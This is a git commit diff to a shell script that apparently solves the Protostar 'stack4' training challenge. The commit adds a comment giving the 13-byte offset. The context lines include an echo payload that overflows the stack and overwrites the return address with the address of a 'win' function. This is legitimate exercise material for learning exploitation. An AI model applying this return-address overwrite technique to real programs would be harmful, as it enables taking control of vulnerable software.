52beab57c9227c212479a72b6748c1f2a7efbbb7
Paul Nykiel <paul.nykiel@gmail.com>
2020-01-13 13:15:12 +0100

    Update group17-s3/stack-four.sh
    Co-Authored-By: Timmifixedit <tim@luchterhand.org>

--- group17-s3/stack-four.sh
+++ group17-s3/stack-four.sh
@@ -5,6 +5,6 @@
 # In the gdb console run
 #   info address win
 # to get the address of the function (0x080483f4 in this case)
-# Then change the return address of the stack, the offset has been found experimentally
+# Then change the return address of the stack, the offset has been found experimentally (in this case 13 bytes)
 # 0x080483f4 (little endian) -> 0xf4 0x83 0x04 0x08
 echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0123456789012\xf4\x83\x04\x08" | /opt/protostar/bin/stack4
